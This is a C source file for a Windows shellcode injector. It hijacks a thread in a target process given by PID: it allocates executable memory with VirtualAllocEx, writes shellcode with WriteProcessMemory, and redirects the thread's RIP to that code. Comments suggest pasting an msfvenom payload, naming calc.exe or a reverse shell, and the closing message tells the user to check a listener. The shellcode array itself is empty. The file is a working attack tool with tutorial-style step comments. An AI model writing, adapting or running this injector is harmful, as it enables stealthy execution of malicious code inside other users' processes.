#include <windows.h>
#include <dbghelp.h>     // For ImageHlp functions (not used here but often with shellcode)
#include <tlhelp32.h>    // For CreateToolhelp32Snapshot + Thread32* functions
#include <stdio.h>       // For printf (not used now, but good to have)

// This is where you will paste your shellcode (e.g. calc.exe, reverse shell, etc.)
// Example: msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char shellcode[] = ""; //shellcode

int main(int argc, char *argv[]) 
{
    // Check if user gave a PID as argument:  injector.exe 1234
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Example: %s 5678\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);  // Convert string PID to number
    HANDLE h_process;           // Handle to target process
    HANDLE h_thread = NULL;     // Handle to a thread inside target process
    PVOID remote_buffer = NULL; // Where shellcode will live in target process
    CONTEXT context = {0};      // Will hold thread registers (RIP, etc.)
    HANDLE h_snapshot;          // Snapshot of all threads in system
    THREADENTRY32 threadEntry;  // Structure to store each thread info

    // Step 1: Open the target process with full access
    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (h_process == NULL) {
        printf("[-] Failed to open process PID %ld (Error: %ld)\n", pid, GetLastError());
        return 1;
    }
    printf("[+] Opened target process PID %ld\n", pid);

    // Step 2: Allocate memory inside the target process for our shellcode
    // MEM_RESERVE | MEM_COMMIT = allocate now
    // PAGE_EXECUTE_READWRITE = allow reading, writing, and executing (bypasses DEP sometimes)
    remote_buffer = VirtualAllocEx(
        h_process,
        NULL,                       // Let Windows choose address
        sizeof(shellcode),          // Size of our shellcode
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    if (remote_buffer == NULL) {
        printf("[-] VirtualAllocEx failed (Error: %ld)\n", GetLastError());
        CloseHandle(h_process);
        return 1;
    }
    printf("[+] Allocated memory at: 0x%p\n", remote_buffer);

    // Step 3: Write the shellcode into the remote process
    if (!WriteProcessMemory(h_process, remote_buffer, shellcode, sizeof(shellcode), NULL)) {
        printf("[-] WriteProcessMemory failed (Error: %ld)\n", GetLastError());
        CloseHandle(h_process);
        return 1;
    }
    printf("[+] Shellcode written successfully!\n");

    // Step 4: Take a snapshot of all threads in the system
    h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create thread snapshot\n");
        CloseHandle(h_process);
        return 1;
    }

    threadEntry.dwSize = sizeof(THREADENTRY32);

    // Step 5: Loop through all threads to find one that belongs to our target PID
    if (Thread32First(h_snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == pid) {
                // Found a thread in the target process!
                h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                printf("[+] Found thread ID %ld in target process\n", threadEntry.th32ThreadID);
                break;  // We only need one thread
            }
        } while (Thread32Next(h_snapshot, &threadEntry));
    }

    CloseHandle(h_snapshot);  // Done with the snapshot

    if (h_thread == NULL) {
        printf("[-] Could not find any thread in target process\n");
        CloseHandle(h_process);
        return 1;
    }

    // Step 6: Suspend the thread so we can safely modify its registers
    SuspendThread(h_thread);
    printf("[+] Thread suspended\n");

    // Step 7: Get current thread context (registers)
    context.ContextFlags = CONTEXT_FULL;  // We want all registers (especially RIP)
    if (!GetThreadContext(h_thread, &context)) {
        printf("[-] GetThreadContext failed (Error: %ld)\n", GetLastError());
        ResumeThread(h_thread);
        CloseHandle(h_thread);
        CloseHandle(h_process);
        return 1;
    }

    // Step 8: Hijack the instruction pointer!
    // On x64, RIP = instruction pointer (where CPU will execute next)
    // We point it directly to our shellcode
    context.Rip = (DWORD_PTR)remote_buffer;
    printf("[+] Changing RIP from 0x%llx -> 0x%p (our shellcode)\n", 
           context.Rip, remote_buffer);

    // Step 9: Apply the modified context (this is the actual hijack!)
    if (!SetThreadContext(h_thread, &context)) {
        printf("[-] SetThreadContext failed (Error: %ld)\n", GetLastError());
    } else {
        printf("[+] Thread context updated successfully!\n");
    }

    // Step 10: Resume the thread → shellcode now executes!
    ResumeThread(h_thread);
    printf("[+] Thread resumed → Shellcode should be running now!\n");

    // Cleanup
    CloseHandle(h_thread);
    CloseHandle(h_process);

    printf("[*] Done! Check your listener or calculator ;)\n");

    return 0;
}